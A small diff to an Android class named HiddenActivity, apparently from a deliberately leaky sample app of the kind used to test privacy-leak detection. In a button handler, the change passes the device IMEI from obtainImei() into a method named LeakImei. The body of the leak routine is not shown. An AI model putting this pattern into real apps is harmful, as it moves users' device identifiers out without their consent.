@@ -26,8 +26,8 @@ public class HiddenActivity extends Activity {
         Button b2 = (Button)findViewById(R.id.button2);
         b2.setOnClickListener(new View.OnClickListener() {
             public void onClick(View v) {
-                svobject.obtainImei();
-                svobject.LeakImei();
+                String data = svobject.obtainImei();
+                svobject.LeakImei(data);
             }
         });
     }
